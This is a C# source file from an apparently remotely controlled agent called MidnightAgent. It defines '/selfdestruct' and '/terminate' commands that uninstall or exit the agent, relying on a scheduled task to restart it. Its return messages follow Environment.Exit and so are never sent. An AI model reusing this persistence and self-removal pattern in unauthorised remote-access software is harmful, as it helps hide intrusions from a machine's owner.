using System;
using System.Threading.Tasks;
using MidnightAgent.Installation;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /selfdestruct - Remove agent completely
    /// </summary>
    public class SelfDestructFeature : IFeature
    {
        public string Command => "selfdestruct";
        public string Description => "Remove agent from system";
        public string Usage => "/selfdestruct";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                // Uninstall
                bool success = Installer.Uninstall();

                if (success)
                {
                    // Wait a bit for message to send
                    await Task.Delay(1000);
                    
                    // Exit
                    Environment.Exit(0);
                    
                    return FeatureResult.Ok("💀 Agent destroyed. Goodbye!");
                }
                else
                {
                    return FeatureResult.Fail("Failed to uninstall");
                }
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// /terminate - Stop agent (but keep installed)
    /// </summary>
    public class TerminateFeature : IFeature
    {
        public string Command => "terminate";
        public string Description => "Stop agent (will restart on next trigger)";
        public string Usage => "/terminate";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            // Exit process (scheduled task will restart it)
            await Task.Delay(500);
            Environment.Exit(0);
            return FeatureResult.Ok("👋 Agent terminated");
        }
    }
}
